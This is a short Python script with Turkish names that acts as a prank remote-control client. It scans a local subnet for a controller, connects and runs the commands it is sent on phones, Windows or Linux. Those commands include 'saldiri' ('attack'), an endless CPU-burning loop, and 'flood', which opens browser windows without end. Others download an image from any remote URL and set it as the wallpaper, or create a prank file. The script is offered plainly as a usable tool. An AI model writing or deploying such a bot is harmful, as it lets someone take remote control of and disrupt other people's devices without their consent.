import socket
import os
import platform
import urllib.request
import subprocess
import time

def cihaz_bilgisi():
    sistem = platform.system()
    if sistem == "Linux" and "Android" in platform.platform():
        return "Telefon"
    elif sistem == "Linux":
        return "Linux PC"
    elif sistem == "Windows":
        return "Windows PC"
    return "Bilinmeyen"

def indir_ve_kaydet(url, dosya_adi="bg.jpg"):
    try:
        urllib.request.urlretrieve(url, dosya_adi)
        return dosya_adi
    except:
        return None

def komut_isle(komut):
    if komut == "google":
        if cihaz == "Telefon":
            os.system("termux-open-url https://www.google.com")
        elif cihaz == "Windows PC":
            os.system("start https://www.google.com")
        elif cihaz == "Linux PC":
            os.system("xdg-open https://www.google.com")
        return "[✓] Google açıldı"

    elif komut == "saldiri":
        while True: pass

    elif komut == "dosya":
        with open("saka.txt", "w") as f:
            f.write("Şaka modu aktif!")
        return "[✓] Dosya oluşturuldu: saka.txt"

    elif komut.startswith("arkaplan"):
        url = komut.split(" ", 1)[1] if " " in komut else None
        if not url:
            return "[!] URL gerekli"
        dosya = indir_ve_kaydet(url)
        if not dosya:
            return "[!] Görsel indirilemedi."
        if cihaz == "Telefon":
            os.system(f'termux-wallpaper -f {dosya}')
        elif cihaz == "Windows PC":
            import ctypes
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(dosya), 3)
        elif cihaz == "Linux PC":
            os.system(f'gsettings set org.gnome.desktop.background picture-uri "file://{os.path.abspath(dosya)}"')
        return f"[✓] Arka plan değiştirildi: {url}"

    elif komut.startswith("saka"):
        return f"[✓] Şaka mesajı: {komut[5:]}"
    
    elif komut == "flood":
        while True:
            os.system("xdg-open https://google.com")

    return "[!] Geçersiz komut"

def baglan(ip, port):
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((ip, port))
        s.send(cihaz.encode())
        while True:
            komut = s.recv(1024).decode()
            if komut == "exit":
                break
            sonuc = komut_isle(komut)
            s.send(sonuc.encode())
        s.close()
    except:
        pass

def aktif_ipleri_tar(modem_ip, port):
    print("[✓] Modemdeki aktif cihazlar taranıyor...")
    for i in range(2, 255):
        hedef_ip = f"{modem_ip.rsplit('.', 1)[0]}.{i}"
        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((hedef_ip, port))
            print(f"[✓] Bağlantı başarılı: {hedef_ip}")
            baglan(hedef_ip, port)
            break
        except:
            print(f"[-] Erişilemedi: {hedef_ip}")

if __name__ == "__main__":
    cihaz = cihaz_bilgisi()
    modem_ip = input("Modem IP gir (örnek 192.168.1.1): ")
    port = int(input("Port gir: "))
    aktif_ipleri_tar(modem_ip, port)
